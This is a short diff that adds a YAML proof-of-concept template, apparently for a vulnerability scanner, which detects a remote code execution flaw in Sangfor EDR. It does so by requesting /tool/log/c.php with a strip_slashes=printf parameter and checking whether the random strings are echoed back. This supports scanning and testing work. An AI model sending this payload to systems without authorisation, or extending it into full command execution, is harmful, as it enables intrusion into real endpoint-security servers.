@@ -1,0 +1,14 @@
+name: poc-yaml-sangfor-edr-tool-rce
+set:
+  r1: randomLowercase(8)
+  r2: randomLowercase(8)
+rules:
+  - method: GET
+    path: "/tool/log/c.php?strip_slashes=printf&host={{r1}}%25%25{{r2}}"
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(r1 + "%" + r2))
+detail:
+  author: cookie
+  links:
+    - https://edr.sangfor.com.cn/
